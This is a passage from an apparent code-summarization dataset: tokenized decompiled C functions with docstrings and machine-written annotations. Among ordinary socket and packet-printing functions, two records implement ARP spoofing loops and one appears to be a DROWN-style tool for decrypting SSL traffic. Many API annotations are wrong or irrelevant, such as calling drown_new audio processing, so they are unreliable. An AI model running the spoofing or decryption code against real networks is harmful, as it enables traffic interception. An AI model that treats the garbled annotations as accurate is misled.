            "number",
            "."
        ],
        "code_tokens": [
            "void",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "port",
            ")",
            "{",
            "sockfd",
            "=",
            "socket",
            "(",
            "2",
            ",",
            "1",
            ",",
            "0",
            ")",
            ";",
            "if",
            "(",
            "sockfd",
            "<",
            "0",
            ")",
            "error",
            "(",
            "\"ERROR opening socket\"",
            ")",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "&",
            "serv_addr",
            ".",
            "sin_family",
            "=",
            "2L",
            "L",
            ";",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "serv_addr",
            ".",
            "sin_zero",
            "=",
            "0L",
            "L",
            ";",
            "portno",
            "=",
            "port",
            ";",
            "serv_addr",
            ".",
            "sin_port",
            "=",
            "htons",
            "(",
            "port",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code initializes a socket on a specified port, handling potential errors, and sets up the server address structure with the specified port number."
    },
    {
        "id": 260,
        "docstring_tokens": [
            "The",
            "code",
            "initializes",
            "a",
            "socket",
            ",",
            "creates",
            "a",
            "thread",
            "to",
            "handle",
            "socket",
            "communication",
            "based",
            "on",
            "user",
            "input",
            ",",
            "and",
            "closes",
            "the",
            "socket",
            "server",
            "when",
            "requested",
            "by",
            "the",
            "user",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "argc",
            ",",
            "const",
            "char",
            "*",
            "*",
            "argv",
            ",",
            "const",
            "char",
            "*",
            "*",
            "envp",
            ")",
            "{",
            "int",
            "port",
            ";",
            "int",
            "tempcheck",
            ";",
            "pthread_t",
            "socketth",
            "[",
            "2",
            "]",
            ";",
            "socketth",
            "[",
            "1",
            "]",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "if",
            "(",
            "argc",
            "<",
            "=",
            "1",
            ")",
            "{",
            "fwrite",
            "(",
            "\"ERROR, no port provided\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x18uL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "__isoc99_sscanf",
            "(",
            "argv",
            "[",
            "1",
            "]",
            ",",
            "\"%d\"",
            ",",
            "&",
            "port",
            ")",
            ";",
            "socket_init",
            "(",
            "port",
            ")",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "while",
            "(",
            "1",
            ")",
            "{",
            "puts",
            "(",
            "\"\\n---------------------------------------------------------------------\"",
            ")",
            ";",
            "puts",
            "(",
            "\"Options: \\n 1. START_SERVER: starts the server process. \"",
            ")",
            ";",
            "printf",
            "(",
            "\" 2. CLOSE_SERVER: closes the server.\\n 3. Exit \\n \\n Enter you choice \"",
            ")",
            ";",
            "tempcheck",
            "=",
            "__isoc99_scanf",
            "(",
            "\"%d\"",
            ",",
            "&",
            "choice",
            ")",
            ";",
            "if",
            "(",
            "choice",
            "!",
            "=",
            "1",
            ")",
            "break",
            ";",
            "pthread_create",
            "(",
            "socketth",
            ",",
            "0L",
            "L",
            ",",
            "(",
            "void",
            "*",
            "(",
            "*",
            ")",
            "(",
            "void",
            "*",
            ")",
            ")",
            "socketthread_handler",
            ",",
            "\"processing...\"",
            ")",
            ";",
            "}",
            "if",
            "(",
            "choice",
            "!",
            "=",
            "2",
            ")",
            "break",
            ";",
            "pthread_cancel",
            "(",
            "socketth",
            "[",
            "0",
            "]",
            ")",
            ";",
            "close",
            "(",
            "newsockfd",
            ")",
            ";",
            "close",
            "(",
            "sockfd",
            ")",
            ";",
            "}",
            "if",
            "(",
            "sockfd",
            ")",
            "close",
            "(",
            "sockfd",
            ")",
            ";",
            "return",
            "0",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `socket` appears to be a part of a network programming library, likely aimed at creating and managing TCP and UDP sockets for communication, with platform-specific implementations for Windows and Unix-like systems.",
            "The function `printf` is being redefined and used within a larger C codebase, particularly in the context of a Reverse Polish Notation (RPN) calculator, for formatting purposes, and in a standard C program for printing \"Hello World\".",
            "The `_cancel` function appears to be part of a networking subsystem in a multi-threaded program, responsible for stopping network-related threads and freeing associated resources, likely used in conjunction with functions related to managing network operations and monitoring in the context of virtualization or system management.",
            "The `close` function likely serves to close file descriptors or handle other resource deallocations in a C program, particularly in contexts involving file operations, memory mapping, and system calls."
        ],
        "longer_label": "The provided C code is a multi-threaded server program that initializes a socket based on a provided port number, allows user interaction through a menu system to start or close the server, and manages threads for socket operations, ensuring proper resource cleanup upon server closure."
    },
    {
        "id": 261,
        "docstring_tokens": [
            "The",
            "code",
            "initializes",
            "SSL",
            ",",
            "reads",
            "command",
            "line",
            "arguments",
            ",",
            "reads",
            "public",
            "key",
            ",",
            "decrypts",
            "input",
            "using",
            "a",
            "trimmer",
            ",",
            "computes",
            "modulus",
            "inverse",
            "and",
            "modulus",
            "multiplication",
            ",",
            "and",
            "dumps",
            "the",
            "result",
            "into",
            "Wireshark",
            "format",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "argc",
            ",",
            "const",
            "char",
            "*",
            "*",
            "argv",
            ",",
            "const",
            "char",
            "*",
            "*",
            "envp",
            ")",
            "{",
            "__int64",
            "v3",
            ";",
            "const",
            "char",
            "*",
            "v4",
            ";",
            "const",
            "char",
            "*",
            "v5",
            ";",
            "void",
            "*",
            "ptr",
            ";",
            "size_t",
            "n",
            ";",
            "char",
            "v9",
            "[",
            "16",
            "]",
            ";",
            "const",
            "char",
            "*",
            "v10",
            ";",
            "__int64",
            "v11",
            ";",
            "char",
            "v12",
            "[",
            "8",
            "]",
            ";",
            "__int64",
            "v13",
            ";",
            "__int64",
            "v14",
            ";",
            "__int64",
            "v15",
            ";",
            "unsigned",
            "__int64",
            "v16",
            ";",
            "v16",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "OPENSSL_init_ssl",
            "(",
            "0L",
            "L",
            ",",
            "0L",
            "L",
            ",",
            "envp",
            ")",
            ";",
            "OPENSSL_init_ssl",
            "(",
            "2097154L",
            "L",
            ",",
            "0L",
            "L",
            ",",
            "v3",
            ")",
            ";",
            "drown_new",
            "(",
            "&",
            "v10",
            ")",
            ";",
            "if",
            "(",
            "argc",
            "!",
            "=",
            "3",
            ")",
            "{",
            "_fprintf_chk",
            "(",
            "stderr",
            ",",
            "1L",
            "L",
            ",",
            "\"Usage : %s host:port certfile\\n\"",
            ",",
            "*",
            "argv",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "v4",
            "=",
            "argv",
            "[",
            "1",
            "]",
            ";",
            "v5",
            "=",
            "argv",
            "[",
            "2",
            "]",
            ";",
            "v10",
            "=",
            "v4",
            ";",
            "read_public_key",
            "(",
            "&",
            "v10",
            ",",
            "v5",
            ")",
            ";",
            "trimmers_new",
            "(",
            "v9",
            ",",
            "40L",
            "L",
            ")",
            ";",
            "ptr",
            "=",
            "0L",
            "L",
            ";",
            "while",
            "(",
            "getline",
            "(",
            "(",
            "char",
            "*",
            "*",
            ")",
            "&",
            "ptr",
            ",",
            "&",
            "n",
            ",",
            "stdin",
            ")",
            "!",
            "=",
            "-",
            "1",
            ")",
            "{",
            "if",
            "(",
            "!",
            "(",
            "unsigned",
            "int",
            ")",
            "BN_hex2bn",
            "(",
            "v12",
            ",",
            "ptr",
            ")",
            ")",
            "{",
            "fwrite",
            "(",
            "\"ERROR : c is not a valid hexadecimal string\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x2CuL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "exit",
            "(",
            "1",
            ")",
            ";",
            "}",
            "BN_set_word",
            "(",
            "v13",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "if",
            "(",
            "(",
            "unsigned",
            "int",
            ")",
            "find_trimmer",
            "(",
            "&",
            "v10",
            ",",
            "v9",
            ")",
            ")",
            "{",
            "decrypt",
            "(",
            "&",
            "v10",
            ")",
            ";",
            "BN_mod_inverse",
            "(",
            "v13",
            ",",
            "v13",
            ",",
            "v11",
            ",",
            "v15",
            ")",
            ";",
            "BN_mod_mul",
            "(",
            "v14",
            ",",
            "v14",
            ",",
            "v13",
            ",",
            "v11",
            ",",
            "v15",
            ")",
            ";",
            "dump_wireshark",
            "(",
            "ptr",
            ",",
            "v14",
            ")",
            ";",
            "}",
            "else",
            "{",
            "fwrite",
            "(",
            "\"Could not find a valid trimmer\\n\"",
            ",",
            "1uL",
            "L",
            ",",
            "0x1FuL",
            "L",
            ",",
            "stderr",
            ")",
            ";",
            "}",
            "}",
            "free",
            "(",
            "ptr",
            ")",
            ";",
            "trimmers_free",
            "(",
            "v9",
            ")",
            ";",
            "drown_free",
            "(",
            "&",
            "v10",
            ")",
            ";",
            "return",
            "0",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function \"__read\" appears to be used for reading data from various sources, such as devices or files, and performing related operations like buffer allocation, invoking device read functions, or handling file system driver calls, within an embedded system or similar context.",
            "Based on the function name \"qword\" and the absence of code snippets, it appears that the function might be intended to retrieve or manipulate 64-bit (quadword) data in a program, potentially dealing with data structures or operations that specifically involve 64-bit integers or addresses.",
            "The function `OPENSSL_init_` initializes OpenSSL library, configuring it according to the OpenSSL version, setting up mutex locks for thread safety, and enabling cryptographic algorithms and configurations.",
            "The function `drown_new` appears to be used for initializing data structures and resources related to different modules or objects (`t_drown`, `drown_ctx`) within audio signal processing, cryptography, or similar domains, typically invoked upon the creation of a new instance of these modules.",
            "The function `printf` appears to be a C function used for formatted output to the standard output stream, with the provided code snippets demonstrating its usage in defining macros, handling different system environments, and showcasing a simple usage example.",
            "The `public` function likely serves as a placeholder or a marker within the codebase, intended for defining publicly accessible elements or indicating areas where public interface elements should be implemented or referenced."
        ],
        "longer_label": "The provided C code initializes the OpenSSL library, reads a public key from a certificate file, performs decryption on input data using modular arithmetic operations, and dumps the result into a Wireshark-compatible format, while also handling errors and memory management, within a program designed for cryptographic operations."
    },
    {
        "id": 262,
        "docstring_tokens": [
            "The",
            "code",
            "reads",
            "a",
            "string",
            "from",
            "user",
            "input",
            ",",
            "prints",
            "it",
            ",",
            "checks",
            "if",
            "the",
            "string",
            "contains",
            "the",
            "word",
            "``",
            "false",
            "''",
            ",",
            "and",
            "if",
            "found",
            ",",
            "plays",
            "an",
            "alarm",
            "sound",
            "and",
            "sends",
            "an",
            "email",
            "with",
            "a",
            "message",
            "warning",
            "about",
            "computer",
            "theft",
            "."
        ],
        "code_tokens": [
            "int",
            "__cdecl",
            "FUN0",
            "(",
            "int",
            "argc",
            ",",
            "const",
            "char",
            "*",
            "*",
            "argv",
            ",",
            "const",
            "char",
            "*",
            "*",
            "envp",
            ")",
            "{",
            "char",
            "*",
            "str",
            ";",
            "str",
            "=",
            "(",
            "char",
            "*",
            ")",
            "malloc",
            "(",
            "0x64uL",
            "L",
            ")",
            ";",
            "fgets",
            "(",
            "str",
            ",",
            "8",
            ",",
            "stdin",
            ")",
            ";",
            "puts",
            "(",
            "str",
            ")",
            ";",
            "if",
            "(",
            "strstr",
            "(",
            "str",
            ",",
            "\"false\"",
            ")",
            ")",
            "{",
            "system",
            "(",
            "\"afplay crazyAlaram.wav\"",
            ")",
            ";",
            "system",
            "(",
            "\"uuencode < ~/imagesnap | mail -s \\\"Quick! Someone is stealing your computer!!\\\" nyctomer@gmail.com\"",
            ")",
            ";",
            "}",
            "return",
            "0",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `malloc` function is used for memory allocation, primarily in C programming, where it dynamically allocates a block of memory of the specified size and returns a pointer to the beginning of that block."
        ],
        "longer_label": "The code dynamically allocates memory, reads input from the user, and if the input contains the string \"false\", it plays an alarm sound and sends an email with an attached image using the `system` function, potentially indicating a security concern due to its use of `malloc` and potential for command injection."
    },
    {
        "id": 263,
        "docstring_tokens": [
            "This",
            "code",
            "initializes",
            "ARP",
            "spoofing",
            "with",
            "the",
            "specified",
            "gateway",
            "address",
            "and",
            "continuously",
            "sends",
            "ARP",
            "reply",
            "packets",
            "to",
            "the",
            "target",
            "IP",
            "address",
            "."
        ],
        "code_tokens": [
            "void",
            "__fastcall",
            "FUN0",
            "start_arp_spoof",
            "(",
            "__int64",
            "a1",
            ",",
            "__int64",
            "a2",
            ",",
            "__int64",
            "a3",
            ")",
            "{",
            "__int64",
            "v4",
            ";",
            "int",
            "v5",
            "[",
            "2",
            "]",
            ";",
            "__int64",
            "hwaddr",
            ";",
            "unsigned",
            "__int64",
            "v7",
            ";",
            "v7",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "v4",
            "=",
            "libnet_init",
            "(",
            "0L",
            "L",
            ",",
            "0L",
            "L",
            ",",
            "&",
            "errbuf",
            ")",
            ";",
            "v5",
            "[",
            "0",
            "]",
            "=",
            "libnet_name2addr4",
            "(",
            "v4",
            ",",
            "a3",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "v5",
            "[",
            "1",
            "]",
            "=",
            "libnet_name2addr4",
            "(",
            "v4",
            ",",
            "\"0.0.0.0\"",
            ",",
            "0L",
            "L",
            ")",
            ";",
            "hwaddr",
            "=",
            "libnet_get_hwaddr",
            "(",
            "v4",
            ")",
            ";",
            "libnet_autobuild_arp",
            "(",
            "2L",
            "L",
            ",",
            "hwaddr",
            ",",
            "v5",
            ",",
            "a1",
            "+",
            "8",
            ",",
            "&",
            "target_ip_addr",
            ",",
            "v4",
            ")",
            ";",
            "libnet_autobuild_ethernet",
            "(",
            "a1",
            "+",
            "8",
            ",",
            "2054L",
            "L",
            ",",
            "v4",
            ")",
            ";",
            "puts",
            "(",
            "\"starting arp spoof loop\"",
            ")",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "sleep",
            "(",
            "1u",
            ")",
            ";",
            "libnet_write",
            "(",
            "v4",
            ")",
            ";",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function __readfsqword is used to read an unsigned 64-bit integer from the FS segment register, commonly used in low-level programming for accessing thread information or other processor-specific data structures on the Windows platform, particularly in 32-bit environments or when using inline assembly.",
            "This function, net_name2, is part of a group of network-related functions for connecting, sending and receiving data, and querying host information in IDL programming language.",
            "The function `libnet_name2` appears to convert hostnames or textual IP addresses into IPv4 or IPv6 addresses, potentially resolving them using a provided `libnet_t` context, and handling special cases like broadcast or random addresses, aiding in network packet manipulation or analysis.",
            "The function `libnet_get_hwaddr` is intended to retrieve the hardware (MAC) address associated with a given network interface, although the provided code snippets suggest incomplete or inconsistent implementations of this functionality across different contexts or libraries.",
            "The `libnet_autobuild_arp` function is used to automatically construct an Address Resolution Protocol (ARP) packet, including specifying the ARP operation type, sender's hardware and protocol addresses, target's hardware and protocol addresses, and the libnet context, returning a protocol tag value on success or -1 on error.",
            "The function `libnet_autobuild_ethernet` is utilized to automatically construct an Ethernet header, including specifying destination address, protocol type, and handling errors, typically used in network packet construction within the Libnet library."
        ],
        "longer_label": "The code is a function for initiating ARP spoofing, utilizing low-level programming techniques to interact with network-related functions and manipulate network packets for malicious purposes."
    },
    {
        "id": 264,
        "docstring_tokens": [
            "The",
            "code",
            "defines",
            "a",
            "function",
            "that",
            "spoofs",
            "ARP",
            "packets",
            "and",
            "retrieves",
            "MAC",
            "addresses",
            ",",
            "continuously",
            "sending",
            "ARP",
            "requests",
            "and",
            "listening",
            "for",
            "ARP",
            "replies",
            "on",
            "a",
            "network",
            "interface",
            "."
        ],
        "code_tokens": [
            "void",
            "__fastcall",
            "FUN0",
            "arp_spoof",
            "(",
            "void",
            "*",
            "a1",
            ")",
            "{",
            "__int64",
            "v1",
            ";",
            "int",
            "v2",
            ";",
            "char",
            "v3",
            "[",
            "8",
            "]",
            ";",
            "__int64",
            "v4",
            ";",
            "const",
            "char",
            "*",
            "*",
            "v5",
            ";",
            "__int64",
            "v6",
            ";",
            "__int64",
            "hwaddr",
            ";",
            "void",
            "*",
            "v8",
            ";",
            "__int64",
            "v9",
            ";",
            "__int64",
            "v10",
            ";",
            "unsigned",
            "__int8",
            "*",
            "v11",
            ";",
            "unsigned",
            "__int64",
            "v12",
            ";",
            "v12",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "puts",
            "(",
            "\"arp thread started\"",
            ")",
            ";",
            "v5",
            "=",
            "(",
            "const",
            "char",
            "*",
            "*",
            ")",
            "a1",
            ";",
            "v6",
            "=",
            "libnet_init",
            "(",
            "0L",
            "L",
            ",",
            "0L",
            "L",
            ",",
            "&",
            "errbuf",
            ")",
            ";",
            "src_ip_addr",
            "=",
            "libnet_get_ipaddr4",
            "(",
            "v6",
            ")",
            ";",
            "hwaddr",
            "=",
            "libnet_get_hwaddr",
            "(",
            "v6",
            ")",
            ";",
            "target_ip_addr",
            "=",
            "libnet_name2addr4",
            "(",
            "v6",
            ",",
            "*",
            "(",
            "_QWORD",
            "*",
            ")",
            "a1",
            ",",
            "1L",
            "L",
            ")",
            ";",
            "libnet_autobuild_arp",
            "(",
            "1L",
            "L",
            ",",
            "hwaddr",
            ",",
            "&",
            "src_ip_addr",
            ",",
            "&",
            "zero_hw_addr",
            ",",
            "&",
            "target_ip_addr",
            ",",
            "v6",
            ")",
            ";",
            "libnet_autobuild_ethernet",
            "(",
            "&",
            "bcast_hw_addr",
            ",",
            "2054L",
            "L",
            ",",
            "v6",
            ")",
            ";",
            "v8",
            "=",
            "malloc",
            "(",
            "0x100uL",
            "L",
            ")",
            ";",
            "v1",
            "=",
            "libnet_getdevice",
            "(",
            "v6",
            ")",
            ";",
            "v9",
            "=",
            "pcap_create",
            "(",
            "v1",
            ",",
            "v8",
            ")",
            ";",
            "pcap_activate",
            "(",
            "v9",
            ")",
            ";",
            "puts",
            "(",
            "\"ARPING \"",
            ")",
            ";",
            "libnet_write",
            "(",
            "v6",
            ")",
            ";",
            "while",
            "(",
            "1",
            ")",
            "{",
            "while",
            "(",
            "1",
            ")",
            "{",
            "sleep",
            "(",
            "1u",
            ")",
            ";",
            "v2",
            "=",
            "pcap_next_ex",
            "(",
            "v9",
            ",",
            "v3",
            ",",
            "&",
            "v4",
            ")",
            ";",
            "if",
            "(",
            "v2",
            ">",
            "=",
            "0",
            ")",
            "break",
            ";",
            "printf",
            "(",
            "\"arp thread started END %d\\n\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "v2",
            ")",
            ";",
            "}",
            "v10",
            "=",
            "v4",
            ";",
            "if",
            "(",
            "ntohs",
            "(",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "12",
            ")",
            ")",
            "=",
            "=",
            "2054",
            ")",
            "{",
            "v11",
            "=",
            "(",
            "unsigned",
            "__int8",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "14",
            ")",
            ";",
            "if",
            "(",
            "ntohs",
            "(",
            "*",
            "(",
            "_WORD",
            "*",
            ")",
            "(",
            "v4",
            "+",
            "20",
            ")",
            ")",
            "=",
            "=",
            "2",
            "&",
            "&",
            "!",
            "memcmp",
            "(",
            "v11",
            "+",
            "14",
            ",",
            "&",
            "target_ip_addr",
            ",",
            "4uL",
            "L",
            ")",
            ")",
            "{",
            "printf",
            "(",
            "\"Retrieved MAC from %s [%02x:%02x:%02x:%02x:%02x:%02x] \\n\"",
            ",",
            "*",
            "v5",
            ",",
            "v11",
            "[",
            "8",
            "]",
            ",",
            "v11",
            "[",
            "9",
            "]",
            ",",
            "v11",
            "[",
            "10",
            "]",
            ",",
            "v11",
            "[",
            "11",
            "]",
            ",",
            "v11",
            "[",
            "12",
            "]",
            ",",
            "v11",
            "[",
            "13",
            "]",
            ")",
            ";",
            "libnet_destroy",
            "(",
            "v6",
            ")",
            ";",
            "start_arp_spoof",
            "(",
            "(",
            "__int64",
            ")",
            "v11",
            ",",
            "v6",
            ",",
            "(",
            "__int64",
            ")",
            "v5",
            "[",
            "1",
            "]",
            ")",
            ";",
            "}",
            "}",
            "}",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The `__read` function appears to be involved in low-level system operations, possibly related to device I/O handling, file system operations, or interaction with shared libraries, with implementations varying depending on the specific context and requirements within the codebase.",
            "The function \"qword\" likely deals with processing or manipulating quadruple-word data structures, although without the actual code snippets it's hard to provide a precise explanation.",
            "The \"libnet_\" function appears to be part of a packet sniffing and filtering program, utilizing libnet for raw socket operations to capture and potentially manipulate network packets based on specified filters.",
            "The function `libnet_get_ipaddr` is likely designed to retrieve the IPv4 address associated with a given network interface and is part of a library for network packet construction and injection.",
            "The function `libnet_get_hwaddr` appears to be designed to retrieve the hardware (MAC) address associated with a given network interface, with different implementations for various environments and libraries, but the provided code lacks a consistent and complete definition for the function.",
            "The function `_name2` likely serves as a utility function within a larger system, providing various input/output operations and status management functionalities, possibly for handling file operations, core names, paths, and menus, but its exact purpose within the broader context would require additional code context.",
            "Based on the function name \"_autob\" and the absence of code snippets, it appears this function might be intended for automatic behavior or handling tasks without explicit code provided, possibly serving as a placeholder for future implementation.",
            "The _autobuild_ethernet function is used to automatically build an ethernet header for network packet construction.",
            "The \"malloc\" function is used to allocate memory on the heap in C programming, typically used to dynamically allocate memory for data structures such as arrays or structs.",
            "The function `libnet_getdevice` is intended to retrieve the canonical name of the network device used for packet injection within a libnet context, facilitating network programming tasks.",
            "The `activate` function seems to be a part of a larger system or program, likely related to signal processing or device control, where it initializes certain parameters and variables, potentially associated with gain control or device activation, upon invocation."
        ],
        "longer_label": "The code appears to be a function for ARP spoofing using low-level system operations, libnet for packet manipulation, and raw socket operations for capturing and filtering network packets."
    },
    {
        "id": 265,
        "docstring_tokens": [
            "The",
            "function",
            "cleanup",
            "closes",
            "a",
            "socket",
            "file",
            "descriptor",
            "after",
            "clearing",
            "the",
            "IFF_PROMISC",
            "flag",
            "from",
            "the",
            "interface",
            "flags",
            "using",
            "ioctl",
            "."
        ],
        "code_tokens": [
            "int",
            "FUN0",
            "(",
            ")",
            "{",
            "__int16",
            "v0",
            ";",
            "LOBYTE",
            "(",
            "v0",
            ")",
            "=",
            "word_6270",
            ";",
            "HIBYTE",
            "(",
            "v0",
            ")",
            "=",
            "HIBYTE",
            "(",
            "word_6270",
            ")",
            "&",
            "0xFE",
            ";",
            "word_6270",
            "=",
            "v0",
            ";",
            "ioctl",
            "(",
            "sfd",
            ",",
            "0x8914uL",
            "L",
            ",",
            "ifr",
            ")",
            ";",
            "return",
            "close",
            "(",
            "sfd",
            ")",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [],
        "longer_label": "The provided code snippet performs operations involving a variable `word_6270`, manipulating its bytes and then performing an ioctl operation using a socket file descriptor `sfd` followed by closing the descriptor."
    },
    {
        "id": 266,
        "docstring_tokens": [
            "The",
            "code",
            "prints",
            "the",
            "contents",
            "of",
            "a",
            "network",
            "packet",
            "in",
            "a",
            "formatted",
            "manner",
            ",",
            "including",
            "Ethernet",
            "header",
            "information",
            "and",
            "the",
            "packet",
            "data",
            "displayed",
            "in",
            "hexadecimal",
            "and",
            "ASCII",
            "format",
            "."
        ],
        "code_tokens": [
            "unsigned",
            "__int64",
            "FUN0",
            "printpacket",
            "(",
            "unsigned",
            "__int8",
            "*",
            "a1",
            ",",
            "signed",
            "int",
            "a2",
            ")",
            "{",
            "unsigned",
            "__int8",
            "v2",
            ";",
            "unsigned",
            "__int8",
            "v3",
            ";",
            "unsigned",
            "__int8",
            "v5",
            ";",
            "unsigned",
            "int",
            "i",
            ";",
            "int",
            "j",
            ";",
            "int",
            "k",
            ";",
            "char",
            "s",
            "[",
            "56",
            "]",
            ";",
            "unsigned",
            "__int64",
            "v11",
            ";",
            "v11",
            "=",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            ";",
            "memset",
            "(",
            "s",
            ",",
            "0",
            ",",
            "sizeof",
            "(",
            "s",
            ")",
            ")",
            ";",
            "printf",
            "(",
            "\"[%dB] %02x:%02x:%02x:%02x:%02x:%02x -> \"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "a2",
            ",",
            "a1",
            "[",
            "6",
            "]",
            ",",
            "a1",
            "[",
            "7",
            "]",
            ",",
            "a1",
            "[",
            "8",
            "]",
            ",",
            "a1",
            "[",
            "9",
            "]",
            ",",
            "a1",
            "[",
            "10",
            "]",
            ",",
            "a1",
            "[",
            "11",
            "]",
            ")",
            ";",
            "printf",
            "(",
            "\"%02x:%02x:%02x:%02x:%02x:%02x | \"",
            ",",
            "*",
            "a1",
            ",",
            "a1",
            "[",
            "1",
            "]",
            ",",
            "a1",
            "[",
            "2",
            "]",
            ",",
            "a1",
            "[",
            "3",
            "]",
            ",",
            "a1",
            "[",
            "4",
            "]",
            ",",
            "a1",
            "[",
            "5",
            "]",
            ")",
            ";",
            "putchar",
            "(",
            "10",
            ")",
            ";",
            "for",
            "(",
            "i",
            "=",
            "0",
            ";",
            "(",
            "int",
            ")",
            "i",
            "<",
            "a2",
            ";",
            "i",
            "+",
            "=",
            "16",
            ")",
            "{",
            "printf",
            "(",
            "\"0x%04x:  \"",
            ",",
            "i",
            ")",
            ";",
            "for",
            "(",
            "j",
            "=",
            "0",
            ";",
            "j",
            "<",
            "=",
            "15",
            ";",
            "+",
            "+",
            "j",
            ")",
            "{",
            "if",
            "(",
            "a2",
            "<",
            "=",
            "(",
            "int",
            ")",
            "(",
            "i",
            "+",
            "j",
            ")",
            ")",
            "v2",
            "=",
            "0",
            ";",
            "else",
            "v2",
            "=",
            "a1",
            "[",
            "i",
            "+",
            "j",
            "]",
            ";",
            "if",
            "(",
            "a2",
            "<",
            "=",
            "(",
            "int",
            ")",
            "(",
            "i",
            "+",
            "j",
            ")",
            ")",
            "printf",
            "(",
            "\"   \"",
            ")",
            ";",
            "else",
            "printf",
            "(",
            "\"%02x \"",
            ",",
            "v2",
            ")",
            ";",
            "}",
            "putchar",
            "(",
            "32",
            ")",
            ";",
            "for",
            "(",
            "k",
            "=",
            "0",
            ";",
            "k",
            "<",
            "=",
            "15",
            ";",
            "+",
            "+",
            "k",
            ")",
            "{",
            "if",
            "(",
            "a2",
            "<",
            "=",
            "(",
            "int",
            ")",
            "(",
            "i",
            "+",
            "k",
            ")",
            ")",
            "v3",
            "=",
            "32",
            ";",
            "else",
            "v3",
            "=",
            "a1",
            "[",
            "i",
            "+",
            "k",
            "]",
            ";",
            "v5",
            "=",
            "v3",
            ";",
            "if",
            "(",
            "(",
            "(",
            "*",
            "__ctype_b_loc",
            "(",
            ")",
            ")",
            "[",
            "v3",
            "]",
            "&",
            "0x4000",
            ")",
            "=",
            "=",
            "0",
            ")",
            "v5",
            "=",
            "46",
            ";",
            "putchar",
            "(",
            "v5",
            ")",
            ";",
            "}",
            "putchar",
            "(",
            "10",
            ")",
            ";",
            "}",
            "return",
            "__readfsqword",
            "(",
            "0x28u",
            ")",
            "^",
            "v11",
            ";",
            "}"
        ],
        "fun_name": "",
        "repo": "",
        "starting": "",
        "partition": "",
        "api_call_anno": [
            "The function `__readfsqword` is used to read a quadword (64 bits) from the FS segment register on x86 architectures, allowing direct access to thread-local storage or other data stored in the FS segment.",
            "The `putchar` function is used to output a single character to the display or console, typically in embedded systems or low-level programming environments."
        ],
        "longer_label": "The provided code is a function named `printpacket` which prints information about a packet, including its size, source and destination MAC addresses, and hexadecimal representation of its content, while replacing non-printable characters with periods, and it employs low-level techniques such as direct FS segment register access and character output using `putchar`."
    },
    {
        "id": 267,
        "docstring_tokens": [
            "The",
            "function",
            "printDnsPacket",
            "takes",
            "a",
            "packet",
            "and",
            "its",
            "length",
            "as",
            "input",
            "and",
            "prints",
            "out",
            "the",
            "IP",
            "header",
            "information",
            "followed",
            "by",
            "the",
            "DNS",
            "header",
            "information",
            "."
        ],
        "code_tokens": [
            "int",
            "__fastcall",
            "FUN0",
            "(",
            "char",
            "*",
            "a1",
            ")",
            "{",
            "puts",
            "(",
            "\"\\n\\nIP HEADER\"",
            ")",
            ";",
            "printf",
            "(",
            "\"Version and headerlength: %02x\\n\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "*",
            "a1",
            ")",
            ";",
            "printf",
            "(",
            "\"Should be 00: %02x\\n\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "a1",
            "[",
            "1",
            "]",
            ")",
            ";",
            "printf",
            "(",
            "\"Total length: %02x %02x\\n\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "a1",
            "[",
            "2",
            "]",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "a1",
            "[",
            "3",
            "]",
            ")",
            ";",
            "printf",
            "(",
            "\"Identification: %02x %02x\\n\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "a1",
            "[",
            "4",
            "]",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "a1",
            "[",
            "5",
            "]",
            ")",
            ";",
            "printf",
            "(",
            "\"Flags: %02x\\n\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "a1",
            "[",
            "6",
            "]",
            ")",
            ";",
            "printf",
            "(",
            "\"TTL: %02x\\n\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "a1",
            "[",
            "8",
            "]",
            ")",
            ";",
            "printf",
            "(",
            "\"Protocol (11/17 UDP) %02x\\n\"",
            ",",
            "(",
            "unsigned",
            "int",
            ")",
            "a1",
